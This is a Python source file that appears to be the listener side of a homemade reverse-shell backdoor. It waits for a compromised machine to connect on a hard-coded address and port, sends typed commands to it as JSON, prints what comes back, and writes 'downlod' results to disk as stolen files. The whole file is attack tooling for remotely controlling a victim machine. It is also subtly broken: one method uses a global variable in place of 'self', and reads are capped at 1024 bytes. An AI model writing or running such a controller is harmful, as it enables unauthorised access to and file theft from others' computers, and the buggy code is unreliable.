import socket
import json


class back:
    '''Create a Class..!'''

    def __init__(self, ip, ports):
        '''this is a function'''
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, ports))
        listener.listen(0)
        print("[+] Wating for incoming Connections")
        self.connected, addres = listener.accept()
        print("[+] Get a Connection" + str(addres))


    def send_client(self, data):
        json_data = json.dumps(data)
        encode_data = json_data.encode("utf-8")
        listenr.connected.send(encode_data)


    def reciv_data(self):
        json_data = self.connected.recv(1024)
        decode_data = json_data.decode("utf-8")
        return json.loads(decode_data)


    def remote_control(self, command):
        self.send_client(command)
        return self.reciv_data()
    
    def file_download(self, name, contnd):
        with open(name, 'wb') as file:
            file.write(contnd)
            return "Download Successfull!"
            
    def run(self):
        '''all function run if while True'''
        while True:
            cmd = input(">>")
            cmd = cmd.split()
            result = self.remote_control(cmd)

            if cmd[0]=="downlod":
                result = self.file_download(cmd[1], result)
            
            print(result)   



listenr = back("192.168.0.102", 8080)
listenr.run()

